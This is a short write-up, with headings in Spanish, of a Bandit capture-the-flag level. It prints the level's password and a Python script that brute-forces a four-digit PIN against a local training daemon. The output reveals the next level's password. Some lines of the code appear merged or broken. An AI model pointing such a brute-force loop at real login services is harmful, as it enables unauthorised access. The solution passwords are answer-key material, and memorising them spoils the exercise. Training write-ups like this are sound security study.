# Bandit

## Objetivo
A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing.

## Datos de acceso
bandit24
UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ

## Solución 
```bash
bandit24@bandit:~$ mkdir -p /tmp/secttp  
bandit24@bandit:~$ cd /tmp/secttp  
bandit24@bandit:/tmp/secttp$ touch pincode.py  
bandit24@bandit:/tmp/secttp$ vim pincode.py
import sys  
import socketpincode = 0  
password = "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ"try:  
    # Connect to server  
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  
    s.connect(("127.0.0.1", 30002))  
      
    # Print welcome message  
    welcome_msg = s.recv(2048)  
    print(welcome_msg)    # Try brute-forcing  
    while pincode < 10000:  
        pincode_string = str(pincode).zfill(4)  
        message=password+" "+pincode_string+"\n"        # Send message  
        s.sendall(message.encode())  
        receive_msg = s.recv(1024)        # Check result  
        if "Wrong" in receive_msg:  
            print("Wrong PINCODE: %s" % pincode_string)  
        else:  
            print(receive_msg)  
            break  
        pincode += 1  
finally:  
    sys.exit(1)
bandit24@bandit:/tmp/secttp$ python ./pincode.py  
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.Wrong PINCODE: 0000  
Wrong PINCODE: 0001  
Wrong PINCODE: 0002  
Wrong PINCODE: 0003  
Wrong PINCODE: 0004  
Wrong PINCODE: 0005  
...  
Wrong PINCODE: 2645  
Wrong PINCODE: 2646  
Wrong PINCODE: 2647  
Correct!  
The password of user bandit25 is **uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG**Exiting.  
  
bandit24@bandit:/tmp/secttp$
```

## Notas adicionales

## Referencias
